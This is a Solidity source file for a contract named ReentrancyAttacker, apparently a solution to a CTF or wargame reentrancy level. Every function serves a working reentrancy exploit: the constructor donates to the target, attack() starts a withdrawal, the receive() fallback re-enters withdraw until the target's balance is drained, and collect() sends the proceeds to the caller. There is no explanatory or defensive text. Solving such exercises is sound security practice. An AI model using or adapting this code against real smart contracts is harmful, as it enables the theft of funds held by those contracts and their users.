// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;
import "hardhat/console.sol";

interface ReentrancyInterface {
    function withdraw(uint256 _amount) external;
    function donate(address _to) external payable;
}

contract ReentrancyAttacker {
   
    ReentrancyInterface IReentrance;
    address target;
    uint256 amount;

    constructor(address _contractAddress, uint256 _amount) payable {
        target = _contractAddress; 
        IReentrance = ReentrancyInterface(_contractAddress);
        amount = _amount;
        IReentrance.donate{value: _amount}(address(this));
    }
    function attack(uint _amount) payable external {
        withdraw(_amount);
    }
    
    // Changed from public to internal to keep execution inside the current frame
    function withdraw(uint256 _amount) internal returns(bool){
        if(target.balance >= _amount){
            IReentrance.withdraw(_amount); // High-level call will revert explicitly if it fails
            return true;
        }
        return false;
    }

    receive() external payable {
        if(target.balance >= amount) {
            if(!withdraw(amount)){ // Fixed: No "this." prefix
                return;
            }
        }
        else if (target.balance > 0){
            if (!withdraw(target.balance)){ // Fixed: No "this." prefix
                return;
            }
        }
    }
    
    // Emergency function to grab your winnings
    function collect() external {
        payable(msg.sender).transfer(address(this).balance);
    }
}
